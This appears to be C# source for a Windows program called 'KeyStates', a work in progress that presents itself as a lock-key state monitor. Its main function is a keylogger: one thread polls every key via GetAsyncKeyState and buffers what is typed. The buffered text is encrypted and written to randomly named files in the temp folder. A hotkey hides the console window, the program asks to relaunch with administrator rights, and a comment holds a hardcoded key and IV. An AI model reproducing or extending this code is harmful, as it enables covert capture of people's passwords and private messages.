/*
 6-19-2024
 KeyStates W.I.P
 domer/PeripheralVisionPD2
*/

using KeyStates;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

new KeyStatesCl().OnStart(); // start program

namespace KeyStates
{
    public struct LogCache
    {
        public string data;
    }

    public struct KeyCache
    {
        public bool Caps;
        public bool Num;
        public bool Scroll;
    }

    public struct DbgMsgQueue
    {
        public String input;
        public DbgMsgTypes type;
        public bool timestamp;
    }

    public enum DbgMsgTypes : int
    {
        Default = 0,
        Error = 1
    }

    internal class KeyStatesCl
    {
        private List<DbgMsgQueue> WaitingMsgs = new();
        private Encryption.StringEncryptionService CryTxt = new Encryption.StringEncryptionService();

        //private FileEncryption Encrypt = new FileEncryption(); // archaic code

        // static data //
        private static readonly int SW_HIDE = 0;

        private static readonly string EncPass = "fart";
        private static readonly int SW_SHOW = 5;
        private static readonly ushort[] KeyArr = [0x14, 0x90, 0x91]; // caps, num, scroll
        private static readonly int ShfKey = 0x10;
        private static readonly int ConHide = 0x75;   // f6
        private static readonly int DecKey = 0x76;   // f7
        private static readonly int KillKey = 0x77;   // f8
        // end section//

        // editable data //
        private bool ConStat = true;

        private bool DecTog = false;
        private bool EmrKill = false;
        private bool ConIntr = false;
        private String TmpPath = "";
        private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
        private LogCache LogHolder;                     // keylogger input buffer

        // end section //

        // dll imports section //

        /* [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AttachConsole(uint dwProcessId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool FreeConsole();/* /*left over dbg crap*/

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern bool MessageBeep(uint uType);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        // end section //

        // program main functions //
        private static string SecureRandomString(int length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                var bytes = new byte[length];
                rng.GetBytes(bytes);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
            }
        }

        private void DestroyLog()
        {
            bool KeyPress = ShowConfirmation("[!] do you want to delete log files ?");
            if (KeyPress)
            {
                if (Directory.Exists(TmpPath))
                {
                    //CryptNHide(); old code
                    //IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath); // dbg junk
                    // foreach (string ExistFile in ExistFiles)                          //
                    //     DbgMsg(ExistFile);                                           //
                    Directory.Delete(TmpPath, true);
                    AddMsgQ("folder deleted");
                    Thread.Sleep(3000);
                }
            }
            EmrKill = true;
            return;
        }

        //dbg crap below
        /* [DBG]: encryption key: 59FE94387929A1F21A221B6A0F009B2F129FAEC1CCB91859C02273BE97E34450 :[END]
        [DBG]: encryption iv: 6186981092199FC76D924A16414AF7B5 :[END] */

        /////////
        private void StartDec()
        {
            String TypKey = "";
            String TypIV = "";
            DecTog = true;

            Console.Clear();
            AddMsgQ("entered decrypt mode");
            while (WaitingMsgs.Count > 0)
            {
                Thread.Sleep(200);
            }
            Console.Write("[+] please enter key: ");
            TypKey = Console.ReadLine();
            Console.Write("[+] please enter iv: ");
            TypIV = Console.ReadLine();
            Console.Clear();
            CryTxt.SetKey(TypKey);
            CryTxt.SetIV(TypIV);

            AddMsgQ($"key: ${TypKey}");
            AddMsgQ($"iv: ${TypIV}");
            bool KeyPress = ShowConfirmation("[!] decrypt all files? ");
            if (KeyPress)
            {
                bool KeyPress2 = ShowConfirmation("[!] delete original encrypted .ksd files after decryption?");

                foreach (string x in Directory.EnumerateFiles(Environment.CurrentDirectory))
                {
                    if (Path.GetExtension(x) == ".ksd")
                    {
                        AddMsgQ(x);
                        String TmpFln = SecureRandomString(6);
                        String EncFil = File.ReadAllText(x);
                        String DecFil = CryTxt.Decrypt(EncFil);
                        if (DecFil == "./YYZZYY\\.")
                        {
                            AddMsgQ("decrypting failed", DbgMsgTypes.Error);
                            while (WaitingMsgs.Count > 0)
                            {
                                Thread.Sleep(200);
                            }
                            Console.Write("[!] Restarting");
                            Thread.Sleep(1000);
                            Console.Write(".");
                            Thread.Sleep(1000);
                            Console.Write(".");
                            Thread.Sleep(1000);
                            Console.Write(".");
                            Thread.Sleep(1000);
                            Console.Write(".");
                            Thread.Sleep(1000);
                            Console.Write(".");
                            ElevateProg();
                            EmrKill = true;
                            return;
                        }
                        if (KeyPress2)
                        {
                            File.Delete(x);
                        }
                        AddMsgQ($"{TmpPath}\\{TmpFln}.txt");
                        File.WriteAllText($"{TmpPath}\\{TmpFln}.txt", DecFil);
                        //DbgMsg($"dumped keylog cache to {TmpFln}.dat", DbgMsgTypes.Default, true);
                    }
                }
            }
            DecTog = false;
            while (WaitingMsgs.Count > 0)
            {
                Thread.Sleep(200);
            }
            Console.Write("[!] Restarting");
            Thread.Sleep(1000);
            Console.Write(".");
            Thread.Sleep(1000);
            Console.Write(".");
            Thread.Sleep(1000);
            Console.Write(".");
            Thread.Sleep(1000);
            Console.Write(".");
            Thread.Sleep(1000);
            Console.Write(".");
            ElevateProg();
            EmrKill = true;
        }

        private void LoopKeys()
        {
            AddMsgQ("keylog thread started");
            int x = 0;
            while (true)
            {
                if (EmrKill)
                    return;
                for (int i = 0; i < 256; i++)
                {
                    bool LwUp = false;
                    if (GetAsyncKeyState(ShfKey) == 0) // check to see if the user is holding shift
                    {
                        LwUp = true;
                    }
                    if (GetAsyncKeyState(i) != 0)
                    {
                        char key = (char)i;
                        if (key == ConHide)     // f6 key to toggle dbg console
                            TglCon();
                        if (i == DecKey)    // f8 to kill program and delete all files
                            StartDec();
                        if (i == KillKey)    // f8 to kill program and delete all files
                            DestroyLog();
                        if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
                            break;
                        if (i == 0x08)
                        {
                            LogHolder.data = LogHolder.data.Remove(LogHolder.data.Length - 1);
                            break;
                        }
                        if (LwUp == false || StateHolder.Caps == true)  // if the user is holding shift or caps lock is on, print the output character in uppercase, else print in lowercase
                        {
                            // Console.Write(key.ToString().ToUpper()); // dbg junk code
                            LogHolder.data += key.ToString().ToUpper();
                        }
                        else
                        {
                            // Console.Write(key.ToString().ToLower()); // dbg junk code
                            LogHolder.data += key.ToString().ToLower();
                        }
                        break;
                    }
                    x++;
                }
                if (x >= 90000 && LogHolder.data.Length > 25)
                {
                    // Console.Clear(); // dbg junk code
                    String TmpFln = SecureRandomString(6);
                    byte[] correctBytes = Encoding.UTF8.GetBytes(LogHolder.data.Replace("\u0001", " "));
                    string correctString = Encoding.UTF8.GetString(correctBytes);

                    File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(correctString));
                    LogHolder.data = "";
                    AddMsgQ($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
                    x = 0;
                }
                Thread.Sleep(75);   // delay to prevent repeating characters //
            }
        }

        private void AddMsgQ(String input, DbgMsgTypes type = DbgMsgTypes.Default, bool timestamp = false)
        {
            DbgMsgQueue item;
            item.input = input;
            item.type = type;
            item.timestamp = timestamp;
            WaitingMsgs.Add(item);
        }

        private void ChkMsgQ()
        {
            List<DbgMsgQueue> RemCache = new();
            List<DbgMsgQueue> WaitingMsgsCache = WaitingMsgs;
            if (WaitingMsgsCache.Count > 0)
            {
                for (var i = 0; i < WaitingMsgsCache.Count; i++)
                {
                    var item = WaitingMsgsCache.ElementAt(i);
                    DbgMsg(item.input, item.type, item.timestamp);
                    RemCache.Add(item);
                }
                for (var i = 0; i < RemCache.Count; i++)
                {
                    var item = RemCache.ElementAt(i);
                    WaitingMsgs.Remove(item);
                }
            }
        }

        private void DbgMsg(String input, DbgMsgTypes type = DbgMsgTypes.Default, bool timestamp = false)
        {
            if (ConStat == false || !IsDebug())
                return;
            string formattedTimestamp = DateTimeOffset.Now.ToString("yyyyMMddHHmmss");
            switch (type)
            {
                case DbgMsgTypes.Default:

                    if (timestamp)
                    {
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.Write($"||{formattedTimestamp}|| ");
                    }

                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.Write("[DBG]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;

                case DbgMsgTypes.Error:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"||{formattedTimestamp}|| [ERR]: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(input);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(" :[END]");
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
            }
        }

        private static bool IsDebug()
        {
#if DEBUG
            return true;
#endif
            return false;
        }

        private void TglCon()
        {
            // int ProcId = Process.GetCurrentProcess().Id; // dbg junk code
            if (ConStat)
            {
                AddMsgQ("console hidden");
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                ConStat = false;
                return;
            }
            ShowWindow(GetConsoleWindow(), SW_SHOW);
            ConStat = true;
            AddMsgQ("console restored");
            return;
        }

        private static bool CheckTglState(int index)
        {
            return (((ushort)GetKeyState(KeyArr[index])) & 0xffff) != 0;
        }

        private void InitCache()
        {
            LogHolder.data = "";
            StateHolder.Caps = CheckTglState(0);
            StateHolder.Num = CheckTglState(1);
            StateHolder.Scroll = CheckTglState(2);
            AddMsgQ("initial cache set");
        }

        private static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void CheckDir()
        {
            if (TmpPath == "")
            {
                if (Environment.GetEnvironmentVariable("TEMP") == null)
                {
                    AddMsgQ("could not find temp path, dumping data to .exe directory", DbgMsgTypes.Error);
                    TmpPath = Path.Combine(Environment.CurrentDirectory, SecureRandomString(10));
                    return;
                }
                TmpPath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), SecureRandomString(10));
                AddMsgQ("tmp path set to " + TmpPath);
            }
            if (!Directory.Exists(TmpPath))
            {
                Directory.CreateDirectory(TmpPath);
            }
        }

        private void UpdateCache()
        {
            ChkMsgQ();
            int i = 0;
            foreach (var key in KeyArr)
            {
                switch (i)
                {
                    case 0:
                        if (CheckTglState(i) == StateHolder.Caps)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Caps = CheckTglState(i);
                        AddMsgQ("CAPSLK " + StateHolder.Caps);
                        break;

                    case 1:
                        if (CheckTglState(i) == StateHolder.Num)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Num = CheckTglState(i);
                        AddMsgQ("NUMLK " + StateHolder.Num);
                        break;

                    case 2:
                        if (CheckTglState(i) == StateHolder.Scroll)
                        {
                            break;
                        }
                        MessageBeep(0x00000040);
                        StateHolder.Scroll = CheckTglState(i);
                        AddMsgQ("SCRLK " + StateHolder.Scroll);
                        break;
                }
                i++;
            }
        }

        private static void ElevateProg()
        {
            ProcessStartInfo startInfo = new("KeyStates.exe");
            startInfo.UseShellExecute = true;
            startInfo.Verb = "runas";
            Process.Start(startInfo);
        }

        private void LogKeys()
        {
            AddMsgQ("keytgl thread started");
            StateHolder.Caps = false;
            StateHolder.Scroll = false;
            StateHolder.Num = false;
            while (true)
            {
                if (ConIntr)
                    break;
                if (EmrKill)
                    return;
                UpdateCache();
                Thread.Sleep(200);
            }
        }

        private static bool ShowConfirmation(string message, bool error = false)
        {
            System.ConsoleColor OrgColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            if (error)
            {
                Console.ForegroundColor = ConsoleColor.Red;
            }

            Console.Write($"{message} [Y/N]: ");
            Console.ForegroundColor = OrgColor;
            char response = (char)Console.Read();
            return response == 'Y' || response == 'y';
        }

        public void OnStart()
        {
            if (!IsAdministrator())
            {
                bool continueProgram = ShowConfirmation("[!] program needs administrator permissions, relaunch as admin?", true);
                if (continueProgram)
                {
                    ElevateProg();
                }
                else
                {
                    return;
                }
                return;
            }
            else
                AddMsgQ("succesfully launched with admin");

            //TglCon(true);
            AddMsgQ("OnStart called");
            CheckDir();
            InitCache();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("/* 6 - 21 - 2024");
            Console.WriteLine("KeyStates W.I.P");
            Console.WriteLine("domer/PeripheralVisionPD2 */");
            Console.ForegroundColor = ConsoleColor.White;
            AddMsgQ($"encryption key: {CryTxt.ShowKey()}");
            AddMsgQ($"encryption iv: {CryTxt.ShowIV()}");
            Thread KeyLogLoop = new(LoopKeys);
            Thread TglKeyLoop = new(LogKeys);
            KeyLogLoop.Start();
            TglKeyLoop.Start();
        }

        // end section //
    }
}
